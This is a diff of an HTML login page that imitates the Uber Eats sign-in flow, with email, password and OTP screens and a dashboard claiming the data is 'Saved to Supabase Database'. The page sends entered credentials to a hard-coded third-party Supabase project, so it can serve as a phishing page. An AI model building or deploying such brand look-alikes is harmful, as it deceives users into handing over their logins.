@@ -7,346 +7,156 @@
   <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
   <style>
     *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-
     :root {
-      --black: #000000;
-      --white: #ffffff;
-      --gray-100: #f6f6f6;
-      --gray-200: #ebebeb;
-      --gray-400: #c4c4c4;
-      --gray-600: #767676;
-      --gray-800: #3d3d3d;
+      --black: #000000; --white: #ffffff;
+      --gray-100: #f6f6f6; --gray-200: #ebebeb;
+      --gray-600: #767676; --gray-800: #3d3d3d;
+      --green: #2e7d32; --red: #d32f2f;
       --font: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
       --radius: 10px;
     }
-
-    body {
-      font-family: var(--font);
-      background: var(--white);
-      color: var(--black);
-      min-height: 100vh;
-      display: flex;
-      flex-direction: column;
-    }
+    body { font-family: var(--font); background: var(--white); color: var(--black); min-height: 100vh; display: flex; flex-direction: column; }
 
     /* NAV */
-    nav {
-      background: var(--black);
-      padding: 0 24px;
-      height: 60px;
-      display: flex;
-      align-items: center;
-      flex-shrink: 0;
-    }
-    .logo {
-      color: var(--white);
-      font-size: 22px;
-      font-weight: 400;
-      letter-spacing: -0.3px;
-    }
+    nav { background: var(--black); padding: 0 24px; height: 60px; display: flex; align-items: center; }
+    .logo { color: var(--white); font-size: 22px; font-weight: 400; }
     .logo strong { font-weight: 700; }
 
     /* MAIN */
-    main {
-      flex: 1;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      padding: 48px 24px;
-    }
+    main { flex: 1; display: flex; align-items: center; justify-content: center; padding: 48px 24px; }
 
     /* SCREENS */
-    .screen { display: none; width: 100%; max-width: 400px; }
+    .screen { display: none; width: 100%; max-width: 420px; }
     .screen.active { display: block; }
 
-    /* SCREEN 1 – Phone/Email */
-    .screen-title {
-      font-size: 28px;
-      font-weight: 700;
-      line-height: 1.25;
-      margin-bottom: 24px;
-    }
+    /* TYPOGRAPHY */
+    .screen-title { font-size: 28px; font-weight: 700; line-height: 1.25; margin-bottom: 24px; }
+    .screen-sub { font-size: 14px; color: var(--gray-600); margin-bottom: 20px; }
 
+    /* INPUTS */
+    .input-wrap { position: relative; margin-bottom: 14px; }
     .input-field {
-      width: 100%;
-      padding: 14px 16px;
-      font-size: 16px;
-      background: var(--gray-100);
-      border: 2px solid transparent;
-      border-radius: var(--radius);
-      outline: none;
-      transition: border-color 0.15s;
-      font-family: var(--font);
-      color: var(--black);
+      width: 100%; padding: 15px 16px; font-size: 16px;
+      background: var(--gray-100); border: 2px solid transparent;
+      border-radius: var(--radius); outline: none;
+      transition: border-color 0.15s, background 0.15s;
+      font-family: var(--font); color: var(--black);
     }
     .input-field:focus { border-color: var(--black); background: var(--white); }
-
-    .input-wrap {
-      position: relative;
-      margin-bottom: 16px;
-    }
+    .input-field.error-border { border-color: var(--red); }
     .eye-btn {
-      position: absolute;
-      right: 14px;
-      top: 50%;
-      transform: translateY(-50%);
-      background: none;
-      border: none;
-      cursor: pointer;
-      padding: 4px;
-      line-height: 0;
-      color: var(--gray-800);
+      position: absolute; right: 14px; top: 50%; transform: translateY(-50%);
+      background: none; border: none; cursor: pointer; padding: 4px;
+      line-height: 0; color: var(--gray-800);
     }
+    .field-label { font-size: 12px; color: var(--gray-600); margin-bottom: 6px; font-weight: 500; }
+    .field-error { font-size: 12px; color: var(--red); margin-top: 4px; display: none; }
+    .field-error.show { display: block; }
 
+    /* BUTTONS */
     .btn-primary {
-      width: 100%;
-      padding: 16px;
-      background: var(--black);
-      color: var(--white);
-      font-size: 16px;
-      font-weight: 600;
-      border: none;
-      border-radius: 100px;
-      cursor: pointer;
-      transition: opacity 0.15s;
-      font-family: var(--font);
+      width: 100%; padding: 16px; background: var(--black); color: var(--white);
+      font-size: 16px; font-weight: 600; border: none; border-radius: 100px;
+      cursor: pointer; transition: opacity 0.15s; font-family: var(--font);
+      display: flex; align-items: center; justify-content: center; gap: 8px;
     }
     .btn-primary:hover { opacity: 0.85; }
     .btn-primary:disabled { opacity: 0.4; cursor: not-allowed; }
-
-    .divider {
-      display: flex;
-      align-items: center;
-      gap: 12px;
-      margin: 20px 0;
-      color: var(--gray-600);
-      font-size: 14px;
-    }
-    .divider::before, .divider::after {
-      content: '';
-      flex: 1;
-      height: 1px;
-      background: var(--gray-200);
-    }
-
+    .divider { display: flex; align-items: center; gap: 12px; margin: 20px 0; color: var(--gray-600); font-size: 14px; }
+    .divider::before, .divider::after { content: ''; flex: 1; height: 1px; background: var(--gray-200); }
     .btn-social {
-      width: 100%;
-      padding: 14px 16px;
-      background: var(--gray-100);
-      border: none;
-      border-radius: 100px;
-      font-size: 15px;
-      font-weight: 500;
-      cursor: pointer;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 10px;
-      margin-bottom: 12px;
-      font-family: var(--font);
-      color: var(--black);
-      transition: background 0.15s;
+      width: 100%; padding: 14px 16px; background: var(--gray-100); border: none;
+      border-radius: 100px; font-size: 15px; font-weight: 500; cursor: pointer;
+      display: flex; align-items: center; justify-content: center; gap: 10px;
+      margin-bottom: 12px; font-family: var(--font); color: var(--black); transition: background 0.15s;
     }
     .btn-social:hover { background: var(--gray-200); }
-
-    .consent {
-      margin-top: 20px;
-      font-size: 12px;
-      color: var(--gray-600);
-      line-height: 1.5;
-    }
-
-    /* SCREEN 2 – Password */
-    .welcome-title {
-      font-size: 28px;
-      font-weight: 700;
-      margin-bottom: 28px;
-    }
     .pill-btn {
-      display: inline-block;
-      padding: 10px 18px;
-      background: var(--gray-200);
-      border: none;
-      border-radius: 100px;
-      font-size: 14px;
-      font-weight: 500;
-      cursor: pointer;
-      margin-bottom: 12px;
-      font-family: var(--font);
-      color: var(--black);
-      transition: background 0.15s;
+      display: inline-block; padding: 10px 18px; background: var(--gray-200);
+      border: none; border-radius: 100px; font-size: 14px; font-weight: 500;
+      cursor: pointer; margin-bottom: 12px; font-family: var(--font); color: var(--black); transition: background 0.15s;
     }
     .pill-btn:hover { background: #d0d0d0; }
-
-    .nav-row {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      margin-top: 48px;
-    }
+    .nav-row { display: flex; justify-content: space-between; align-items: center; margin-top: 40px; }
     .btn-circle {
-      width: 48px;
-      height: 48px;
-      border-radius: 50%;
-      border: none;
-      background: var(--gray-200);
-      cursor: pointer;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 18px;
-      transition: background 0.15s;
-      color: var(--black);
+      width: 48px; height: 48px; border-radius: 50%; border: none;
+      background: var(--gray-200); cursor: pointer; display: flex;
+      align-items: center; justify-content: center; font-size: 20px;
+      transition: background 0.15s; color: var(--black);
     }
     .btn-circle:hover { background: #d0d0d0; }
-
     .btn-next {
-      display: flex;
-      align-items: center;
-      gap: 8px;
-      padding: 14px 24px;
-      border-radius: 100px;
-      border: none;
-      font-size: 16px;
-      font-weight: 600;
-      cursor: pointer;
-      font-family: var(--font);
-      background: var(--black);
-      color: var(--white);
-      transition: opacity 0.15s;
+      display: flex; align-items: center; gap: 8px; padding: 14px 28px;
+      border-radius: 100px; border: none; font-size: 16px; font-weight: 600;
+      cursor: pointer; font-family: var(--font); background: var(--black);
+      color: var(--white); transition: opacity 0.15s;
     }
     .btn-next:hover { opacity: 0.85; }
     .btn-next:disabled { background: var(--gray-200); color: var(--gray-600); cursor: not-allowed; opacity: 1; }
+    .consent { margin-top: 20px; font-size: 12px; color: var(--gray-600); line-height: 1.5; }
 
-    /* SCREEN 3 – OTP */
-    .otp-title {
-      font-size: 26px;
-      font-weight: 700;
-      line-height: 1.3;
-      margin-bottom: 28px;
-    }
-    .otp-title span { font-weight: 700; }
-
-    .otp-boxes {
-      display: flex;
-      gap: 10px;
-      margin-bottom: 8px;
-    }
+    /* OTP */
+    .otp-boxes { display: flex; gap: 12px; margin-bottom: 10px; }
     .otp-box {
-      width: 60px;
-      height: 60px;
-      border: 2px solid var(--gray-200);
-      border-radius: var(--radius);
-      font-size: 22px;
-      font-weight: 700;
-      text-align: center;
-      outline: none;
-      font-family: var(--font);
-      background: var(--gray-100);
-      transition: border-color 0.15s;
-      caret-color: transparent;
+      width: 64px; height: 64px; border: 2px solid var(--gray-200);
+      border-radius: var(--radius); font-size: 24px; font-weight: 700;
+      text-align: center; outline: none; font-family: var(--font);
+      background: var(--gray-100); transition: border-color 0.15s;
     }
     .otp-box:focus { border-color: var(--black); background: var(--white); }
-    .otp-box.filled { background: var(--white); border-color: var(--black); }
-
-    .otp-tip {
-      font-size: 13px;
-      color: var(--gray-600);
-      margin-bottom: 24px;
-    }
+    .otp-tip { font-size: 13px; color: var(--gray-600); margin-bottom: 24px; }
 
     /* DASHBOARD */
-    .dashboard {
-      display: none;
-      flex-direction: column;
-      align-items: center;
-      text-align: center;
-      padding: 48px 24px;
-      max-width: 500px;
-      margin: 0 auto;
-    }
+    .dashboard { display: none; flex-direction: column; align-items: center; text-align: center; padding: 40px 24px; max-width: 480px; margin: 0 auto; width: 100%; }
     .dashboard.active { display: flex; }
-    .dashboard-icon {
-      width: 80px;
-      height: 80px;
-      background: var(--black);
-      border-radius: 50%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      margin-bottom: 24px;
+    .dash-avatar { width: 80px; height: 80px; background: var(--black); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-bottom: 16px; }
+    .dashboard h2 { font-size: 26px; font-weight: 700; margin-bottom: 6px; }
+    .dashboard > p { color: var(--gray-600); font-size: 15px; margin-bottom: 8px; }
+    .db-saved-badge {
+      display: inline-flex; align-items: center; gap: 6px;
+      background: #e8f5e9; color: var(--green); font-size: 12px;
+      font-weight: 700; padding: 6px 16px; border-radius: 100px; margin-bottom: 28px;
     }
-    .dashboard-icon svg { color: white; }
-    .dashboard h2 { font-size: 26px; font-weight: 700; margin-bottom: 8px; }
-    .dashboard p { color: var(--gray-600); font-size: 15px; margin-bottom: 32px; }
-    .user-card {
-      background: var(--gray-100);
-      border-radius: 16px;
-      padding: 20px 24px;
-      width: 100%;
-      text-align: left;
-      margin-bottom: 24px;
-    }
-    .user-card label { font-size: 12px; color: var(--gray-600); text-transform: uppercase; letter-spacing: 0.5px; }
-    .user-card p { font-size: 16px; font-weight: 600; margin-top: 2px; }
+    .info-grid { width: 100%; display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-bottom: 24px; }
+    .info-card { background: var(--gray-100); border-radius: 14px; padding: 16px 18px; text-align: left; }
+    .info-card.full { grid-column: 1 / -1; }
+    .info-card label { font-size: 11px; color: var(--gray-600); text-transform: uppercase; letter-spacing: 0.6px; font-weight: 600; }
+    .info-card p { font-size: 14px; font-weight: 600; margin-top: 4px; word-break: break-all; }
     .btn-logout {
-      padding: 14px 32px;
-      border-radius: 100px;
-      border: 2px solid var(--black);
-      background: transparent;
-      font-size: 15px;
-      font-weight: 600;
-      cursor: pointer;
-      font-family: var(--font);
-      transition: all 0.15s;
+      padding: 14px 36px; border-radius: 100px; border: 2px solid var(--black);
+      background: transparent; font-size: 15px; font-weight: 600; cursor: pointer;
+      font-family: var(--font); transition: all 0.15s;
     }
     .btn-logout:hover { background: var(--black); color: var(--white); }
 
     /* TOAST */
     .toast {
-      position: fixed;
-      bottom: 32px;
-      left: 50%;
+      position: fixed; bottom: 32px; left: 50%;
       transform: translateX(-50%) translateY(80px);
-      background: var(--black);
-      color: var(--white);
-      padding: 14px 24px;
-      border-radius: 100px;
-      font-size: 14px;
-      font-weight: 500;
-      z-index: 999;
-      opacity: 0;
-      transition: all 0.3s ease;
-      white-space: nowrap;
-      max-width: 90vw;
+      background: var(--black); color: var(--white);
+      padding: 14px 24px; border-radius: 100px;
+      font-size: 14px; font-weight: 500; z-index: 999;
+      opacity: 0; transition: all 0.3s ease;
+      white-space: nowrap; max-width: 90vw; text-align: center;
     }
-    .toast.show {
-      opacity: 1;
-      transform: translateX(-50%) translateY(0);
-    }
-    .toast.error { background: #d32f2f; }
-    .toast.success { background: #2e7d32; }
+    .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
+    .toast.error { background: var(--red); }
+    .toast.success { background: var(--green); }
 
-    /* LOADER */
-    .spinner {
-      display: inline-block;
-      width: 18px;
-      height: 18px;
-      border: 2px solid rgba(255,255,255,0.4);
-      border-top-color: white;
-      border-radius: 50%;
-      animation: spin 0.6s linear infinite;
-      vertical-align: middle;
-    }
+    /* SPINNER */
+    .spinner { display: inline-block; width: 18px; height: 18px; border: 2px solid rgba(255,255,255,0.4); border-top-color: white; border-radius: 50%; animation: spin 0.6s linear infinite; }
     @keyframes spin { to { transform: rotate(360deg); } }
 
-    /* FORGOT PASSWORD */
-    .forgot-screen {
-      display: none;
-      width: 100%;
-      max-width: 400px;
+    /* PASSWORD STRENGTH */
+    .strength-bar { height: 4px; border-radius: 2px; margin-top: 8px; background: var(--gray-200); overflow: hidden; }
+    .strength-fill { height: 100%; border-radius: 2px; transition: width 0.3s, background 0.3s; width: 0; }
+    .strength-text { font-size: 11px; margin-top: 4px; font-weight: 500; }
+
+    @media (max-width: 480px) {
+      .info-grid { grid-template-columns: 1fr; }
+      .info-card.full { grid-column: 1; }
+      .otp-box { width: 54px; height: 54px; font-size: 20px; }
     }
-    .forgot-screen.active { display: block; }
   </style>
 </head>
 <body>
@@ -357,55 +167,78 @@
 
 <main>
 
-  <!-- SCREEN 1: Email / Phone -->
+  <!-- ======= SCREEN 1: Email/Phone ======= -->
   <div class="screen active" id="screen1">
     <h1 class="screen-title">What's your phone number or email?</h1>
     <div class="input-wrap">
-      <input class="input-field" id="emailInput" type="text" placeholder="Enter phone number or email" autocomplete="email" />
+      <input class="input-field" id="emailInput" type="text"
+        placeholder="Enter phone number or email" autocomplete="email" />
+      <div class="field-error" id="emailError">Please enter a valid email address.</div>
     </div>
     <button class="btn-primary" id="continueBtn" onclick="handleContinue()">Continue</button>
     <div class="divider">or</div>
-    <button class="btn-social" onclick="showToast('Google sign-in not configured', 'error')">
-      <svg width="20" height="20" viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.18 1.48-4.97 2.31-8.16 2.31-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/><path fill="none" d="M0 0h48v48H0z"/></svg>
+    <button class="btn-social" onclick="showToast('Google sign-in not configured','error')">
+      <svg width="20" height="20" viewBox="0 0 48 48">
+        <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+        <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+        <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+        <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.18 1.48-4.97 2.31-8.16 2.31-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+      </svg>
       Continue with Google
     </button>
-    <button class="btn-social" onclick="showToast('Apple sign-in not configured', 'error')">
-      <svg width="18" height="20" viewBox="0 0 814 1000" fill="currentColor"><path d="M788.1 340.9c-5.8 4.5-108.2 62.2-108.2 190.5 0 148.4 130.3 200.9 134.2 202.2-.6 3.2-20.7 71.9-68.7 141.9-42.8 61.6-87.5 123.1-155.5 123.1s-85.5-39.5-164-39.5c-76 0-103.7 40.8-165.9 40.8s-105-42.3-150.3-107.9L74.5 602.1c-27.7-37.7-44.1-83.9-44.1-131.6 0-134.2 83.7-203.2 166.3-203.2 44.1 0 81.2 29.1 108.4 29.1 26.5 0 68.1-30.5 119.2-30.5 22.3 0 96.8 2 150.9 64.4zm-10.5-146.4c0-53.3 35.3-111.7 108.2-150.9 9.5-4.6 21.5 0 21.5 12.4 0 62.2-44.1 120.5-118.5 163.3-5.2 2.6-11.2 0-11.2-24.8z"/></svg>
+    <button class="btn-social" onclick="showToast('Apple sign-in not configured','error')">
+      <svg width="18" height="20" viewBox="0 0 814 1000" fill="currentColor">
+        <path d="M788.1 340.9c-5.8 4.5-108.2 62.2-108.2 190.5 0 148.4 130.3 200.9 134.2 202.2-.6 3.2-20.7 71.9-68.7 141.9-42.8 61.6-87.5 123.1-155.5 123.1s-85.5-39.5-164-39.5c-76 0-103.7 40.8-165.9 40.8s-105-42.3-150.3-107.9L74.5 602.1c-27.7-37.7-44.1-83.9-44.1-131.6 0-134.2 83.7-203.2 166.3-203.2 44.1 0 81.2 29.1 108.4 29.1 26.5 0 68.1-30.5 119.2-30.5 22.3 0 96.8 2 150.9 64.4zm-10.5-146.4c0-53.3 35.3-111.7 108.2-150.9 9.5-4.6 21.5 0 21.5 12.4 0 62.2-44.1 120.5-118.5 163.3-5.2 2.6-11.2 0-11.2-24.8z"/>
+      </svg>
       Continue with Apple
     </button>
     <div class="divider">or</div>
-    <button class="btn-social" onclick="showToast('QR login not available on web', 'error')">
-      <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M3 3h7v7H3zm2 2v3h3V5zm8-2h7v7h-7zm2 2v3h3V5zM3 13h7v7H3zm2 2v3h3v-3zm13-2h2v2h-2zm-3 0h2v2h-2zm3 3h2v2h-2zm-3 3h2v2h-2zm3 0h2v2h-2z"/></svg>
+    <button class="btn-social" onclick="showToast('QR login not available on web','error')">
+      <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor">
+        <path d="M3 3h7v7H3zm2 2v3h3V5zm8-2h7v7h-7zm2 2v3h3V5zM3 13h7v7H3zm2 2v3h3v-3zm13-2h2v2h-2zm-3 0h2v2h-2zm3 3h2v2h-2zm-3 3h2v2h-2zm3 0h2v2h-2z"/>
+      </svg>
       Log in with QR code
     </button>
     <p class="consent">You consent to receive a verification code by text or Whatsapp. Message and data rates may apply.</p>
   </div>
 
-  <!-- SCREEN 2: Password -->
+  <!-- ======= SCREEN 2: Password ======= -->
   <div class="screen" id="screen2">
-    <h1 class="welcome-title" id="welcomeName">Welcome back, jordan.</h1>
+    <h1 class="screen-title" id="welcomeName">Welcome back, jordan.</h1>
+    <p class="screen-sub" id="screen2Sub">Enter your password to continue</p>
+
     <div class="input-wrap">
-      <input class="input-field" id="passwordInput" type="password" placeholder="Enter your password" autocomplete="current-password" />
-      <button class="eye-btn" id="eyeBtn" onclick="togglePassword()" title="Show/hide password">
-        <svg id="eyeIcon" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+      <div class="field-label">Password</div>
+      <input class="input-field" id="passwordInput" type="password"
+        placeholder="Enter your password" autocomplete="current-password"
+        oninput="checkPasswordStrength()" />
+      <button class="eye-btn" onclick="togglePassword()" title="Show/hide password">
+        <svg id="eyeIcon" width="22" height="22" viewBox="0 0 24 24" fill="none"
+          stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
           <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
           <circle cx="12" cy="12" r="3"/>
         </svg>
       </button>
+      <div class="strength-bar"><div class="strength-fill" id="strengthFill"></div></div>
+      <div class="strength-text" id="strengthText"></div>
+      <div class="field-error" id="passError">Password must be at least 6 characters.</div>
     </div>
+
     <br>
     <button class="pill-btn" onclick="handleForgotPassword()">I forgot my password</button><br>
     <button class="pill-btn" onclick="goTo('screen1')">More options</button>
 
     <div class="nav-row">
-      <button class="btn-circle" onclick="goTo('screen1')">←</button>
-      <button class="btn-next" id="nextBtn" onclick="handleLogin()">Next →</button>
+      <button class="btn-circle" onclick="goTo('screen1')">&#8592;</button>
+      <button class="btn-next" id="nextBtn" onclick="handleLogin()">Next &#8594;</button>
     </div>
   </div>
 
-  <!-- SCREEN 3: OTP -->
+  <!-- ======= SCREEN 3: OTP ======= -->
   <div class="screen" id="screen3">
-    <h2 class="otp-title">Enter the 4-digit code sent to you at:<br><span id="otpEmail"></span></h2>
+    <h2 class="screen-title">Enter the 4-digit code sent to you at:<br>
+      <span id="otpEmail" style="font-size:18px;font-weight:700;word-break:break-all;"></span>
+    </h2>
     <div class="otp-boxes">
       <input class="otp-box" id="otp0" maxlength="1" inputmode="numeric" />
       <input class="otp-box" id="otp1" maxlength="1" inputmode="numeric" />
@@ -414,28 +247,51 @@
     </div>
     <p class="otp-tip">Tip: Make sure to check your inbox and spam folders</p>
     <button class="pill-btn" onclick="handleResend()">Resend</button>
-
     <div class="nav-row">
-      <button class="btn-circle" onclick="goTo('screen2')">←</button>
-      <button class="btn-next" id="otpNextBtn" disabled onclick="handleOTPVerify()">Next →</button>
+      <button class="btn-circle" onclick="goTo('screen2')">&#8592;</button>
+      <button class="btn-next" id="otpNextBtn" disabled onclick="handleOTPVerify()">Next &#8594;</button>
     </div>
   </div>
 
-  <!-- DASHBOARD -->
+  <!-- ======= DASHBOARD ======= -->
   <div class="dashboard" id="dashboard">
-    <div class="dashboard-icon">
-      <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+    <div class="dash-avatar">
+      <svg width="38" height="38" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
         <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/>
         <circle cx="12" cy="7" r="4"/>
       </svg>
     </div>
-    <h2 id="dashName">Welcome back!</h2>
-    <p>You're signed in to Uber Eats</p>
-    <div class="user-card">
-      <label>Email address</label>
-      <p id="dashEmail">—</p>
+    <h2 id="dashName">Welcome!</h2>
+    <p>Signed in to Uber Eats</p>
+    <div class="db-saved-badge">
+      <svg width="13" height="13" viewBox="0 0 24 24" fill="currentColor">
+        <path d="M12 2C6.48 2 2 4.69 2 8v8c0 3.31 4.48 6 10 6s10-2.69 10-6V8c0-3.31-4.48-6-10-6zm0 2c4.42 0 8 1.79 8 4s-3.58 4-8 4-8-1.79-8-4 3.58-4 8-4zm0 16c-4.42 0-8-1.79-8-4v-2.28C5.49 15.15 8.53 16 12 16s6.51-.85 8-2.28V16c0 2.21-3.58 4-8 4z"/>
+      </svg>
+      Saved to Supabase Database
     </div>
-    <button class="btn-logout" onclick="handleLogout()">Sign out</button>
+    <div class="info-grid">
+      <div class="info-card full">
+        <label>Email Address</label>
+        <p id="dashEmail">-</p>
+      </div>
+      <div class="info-card full">
+        <label>Password (encrypted in Supabase Auth)</label>
+        <p id="dashPass">***** (secured by Supabase)</p>
+      </div>
+      <div class="info-card">
+        <label>User ID</label>
+        <p id="dashId">-</p>
+      </div>
+      <div class="info-card">
+        <label>Login Time</label>
+        <p id="dashTime">-</p>
+      </div>
+      <div class="info-card full">
+        <label>Status</label>
+        <p id="dashStatus" style="color:#2e7d32;">Active</p>
+      </div>
+    </div>
+    <button class="btn-logout" onclick="handleLogout()">Sign Out</button>
   </div>
 
 </main>
@@ -443,208 +299,267 @@
 <div class="toast" id="toast"></div>
 
 <script>
-  // ─── SUPABASE CONFIG ────────────────────────────────────────────────────────
-  // Replace these with your actual Supabase project URL and anon key
-  const SUPABASE_URL  = 'https://sefjbnlxvaurwrvxusxp.supabase.co';
-  const SUPABASE_ANON = 'sb_publishable_Q18RjIWRK497qq3oIsMWWA_98My4fjX';
+  // ============================================================
+  // SUPABASE SETUP
+  // ============================================================
+  var SUPABASE_URL  = 'https://sefjbnlxvaurwrvxusxp.supabase.co';
+  var SUPABASE_ANON = 'sb_publishable_Q18RjIWRK497qq3oIsMWWA_98My4fjX';
 
-  const { createClient } = supabase;
-  const sb = createClient(SUPABASE_URL, SUPABASE_ANON);
+  var sb = supabase.createClient(SUPABASE_URL, SUPABASE_ANON);
 
-  // ─── STATE ──────────────────────────────────────────────────────────────────
-  let currentEmail = '';
-  let isNewUser    = false;
+  var currentEmail    = '';
+  var currentPassword = '';
 
-  // ─── UTILS ──────────────────────────────────────────────────────────────────
+  // ============================================================
+  // UTILITY FUNCTIONS
+  // ============================================================
   function goTo(id) {
-    document.querySelectorAll('.screen, .dashboard').forEach(s => s.classList.remove('active'));
+    document.querySelectorAll('.screen, .dashboard').forEach(function(s) {
+      s.classList.remove('active');
+    });
     document.getElementById(id).classList.add('active');
   }
 
-  function showToast(msg, type = '') {
-    const t = document.getElementById('toast');
+  function showToast(msg, type) {
+    var t = document.getElementById('toast');
     t.textContent = msg;
     t.className = 'toast' + (type ? ' ' + type : '');
     t.classList.add('show');
-    setTimeout(() => t.classList.remove('show'), 3000);
+    setTimeout(function() { t.classList.remove('show'); }, 3500);
   }
 
-  function setLoading(btnId, loading, label = 'Next →') {
-    const btn = document.getElementById(btnId);
-    btn.innerHTML = loading ? '<span class="spinner"></span>' : label;
-    btn.disabled  = loading;
+  function setBtnLoading(id, loading, label) {
+    var btn = document.getElementById(id);
+    if (loading) {
+      btn.innerHTML = '<span class="spinner"></span>';
+      btn.disabled = true;
+    } else {
+      btn.innerHTML = label;
+      btn.disabled = false;
+    }
   }
 
-  function isConfigured() {
-    return !SUPABASE_URL.includes('YOUR_PROJECT') && !SUPABASE_ANON.includes('YOUR_ANON');
+  function showError(id, msg) {
+    var el = document.getElementById(id);
+    if (msg) { el.textContent = msg; el.classList.add('show'); }
+    else { el.classList.remove('show'); }
   }
 
-  // ─── SCREEN 1: Continue ─────────────────────────────────────────────────────
-  async function handleContinue() {
-    const val = document.getElementById('emailInput').value.trim();
-    if (!val) { showToast('Please enter your email or phone', 'error'); return; }
+  // ============================================================
+  // PASSWORD STRENGTH
+  // ============================================================
+  function checkPasswordStrength() {
+    var pw = document.getElementById('passwordInput').value;
+    var fill = document.getElementById('strengthFill');
+    var text = document.getElementById('strengthText');
+    var pct = 0; var color = '#d32f2f'; var label = '';
+    if (pw.length >= 6)  { pct = 33; color = '#f57c00'; label = 'Weak'; }
+    if (pw.length >= 8 && /[A-Z]/.test(pw)) { pct = 66; color = '#1976d2'; label = 'Medium'; }
+    if (pw.length >= 10 && /[A-Z]/.test(pw) && /[0-9]/.test(pw) && /[^A-Za-z0-9]/.test(pw)) {
+      pct = 100; color = '#2e7d32'; label = 'Strong';
+    }
+    fill.style.width = pct + '%';
+    fill.style.background = color;
+    text.textContent = label;
+    text.style.color = color;
+  }
 
-    currentEmail = val;
-    const firstName = val.split('@')[0].split('.')[0];
-    document.getElementById('welcomeName').textContent = `Welcome back, ${firstName}.`;
+  function togglePassword() {
+    var inp = document.getElementById('passwordInput');
+    var icon = document.getElementById('eyeIcon');
+    if (inp.type === 'password') {
+      inp.type = 'text';
+      icon.innerHTML = '<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/>';
+    } else {
+      inp.type = 'password';
+      icon.innerHTML = '<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>';
+    }
+  }
 
-    if (!isConfigured()) {
-      showToast('⚠️ Add your Supabase credentials to enable auth', 'error');
-      document.getElementById('otpEmail').textContent = val;
-      goTo('screen2');
+  // ============================================================
+  // SCREEN 1 — CONTINUE
+  // ============================================================
+  function handleContinue() {
+    var val = document.getElementById('emailInput').value.trim();
+    if (!val) {
+      showError('emailError', 'Please enter your email address.');
       return;
     }
-
-    setLoading('continueBtn', true, 'Continue');
-    // Check if user exists in Supabase by trying sign-in with OTP
-    const { error } = await sb.auth.signInWithOtp({ email: val, options: { shouldCreateUser: true } });
-    setLoading('continueBtn', false, 'Continue');
-
-    if (error) { showToast(error.message, 'error'); return; }
-
+    showError('emailError', '');
+    currentEmail = val;
+    var name = val.includes('@') ? val.split('@')[0] : val;
+    document.getElementById('welcomeName').textContent = 'Welcome back, ' + name + '.';
+    document.getElementById('screen2Sub').textContent = 'Signing in as ' + val;
     document.getElementById('otpEmail').textContent = val;
     goTo('screen2');
   }
 
-  // ─── TOGGLE PASSWORD ────────────────────────────────────────────────────────
-  function togglePassword() {
-    const inp = document.getElementById('passwordInput');
-    const icon = document.getElementById('eyeIcon');
-    if (inp.type === 'password') {
-      inp.type = 'text';
